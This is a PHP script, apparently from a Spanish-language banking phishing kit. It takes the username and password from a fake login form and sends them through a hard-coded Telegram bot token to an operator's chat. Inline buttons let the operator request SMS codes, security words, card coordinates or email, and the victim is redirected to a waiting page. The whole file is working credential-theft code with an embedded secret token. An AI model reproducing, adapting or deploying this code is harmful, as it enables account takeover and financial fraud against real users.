<?php
session_start();
$usuario = $_POST['usuario'];
$clave = $_POST['clave'];
$_SESSION['usuario'] = $usuario;

$mensaje = "Nuevo login:\nUsuario: $usuario\nClave: $clave";

$token = "7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c";
$chat_id = "5157616506";

$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"]
        ],
        [
            ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"],
            ["text" => "📧 Correo", "callback_data" => "CORREO|$usuario"]
        ]
    ]
];

$data = [
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
header("Location: espera.php");
exit;
?>
